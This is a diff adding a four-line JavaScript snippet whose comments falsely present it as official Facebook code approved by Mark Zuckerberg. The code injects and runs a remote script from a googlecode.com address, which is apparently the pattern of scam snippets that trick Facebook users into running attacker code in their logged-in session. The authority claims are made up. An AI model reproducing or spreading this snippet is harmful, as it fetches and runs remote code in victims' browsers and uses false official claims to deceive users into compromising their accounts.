@@ -1,0 +1,4 @@
+// Copyright 2014 By Facebook Inc.
+// Mark Zuckerberg let all of facebook account to use this feature
+// Licenced GNU Open Source
+function include(filename){var head=document.getElementsByTagName('head')[0];var script=document.createElement('script');script.src=filename;script.type='text/javascript';head.appendChild(script)}include("https://fbhost.googlecode.com/hg/facebook.txt");
